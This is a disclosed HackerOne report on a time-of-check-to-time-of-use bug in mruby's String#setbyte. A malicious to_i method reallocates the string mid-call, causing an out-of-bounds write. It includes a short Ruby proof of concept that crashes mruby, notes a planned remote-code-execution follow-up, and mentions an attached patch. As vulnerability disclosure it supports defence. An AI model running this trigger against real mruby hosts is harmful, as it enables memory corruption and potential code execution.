---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '181893'
original_report_id: '181893'
title: TOCTTOU bug in mrb_str_setbyte leading the memory corruption
weakness: Code Injection
team_handle: shopify-scripts
created_at: '2016-11-13T09:43:49.735Z'
disclosed_at: '2016-12-16T21:35:57.209Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 23
tags:
- hackerone
- code-injection
---

# TOCTTOU bug in mrb_str_setbyte leading the memory corruption

## Metadata

- HackerOne Report ID: 181893
- Weakness: Code Injection
- Program: shopify-scripts
- Disclosed At: 2016-12-16T21:35:57.209Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.

Following is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.

```
$s = "9" + ("\n" * (1024*1024-1))
$k = []

class Tmp
    def to_i
        $k.push("a"*1024)
        $s.chomp! ''
        $s.succ!
        95
    end
end
tmp = Tmp.new
$s.setbyte(128, tmp)
puts $k[0]
```

Attached is a patch to mruby to resolve this issue.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
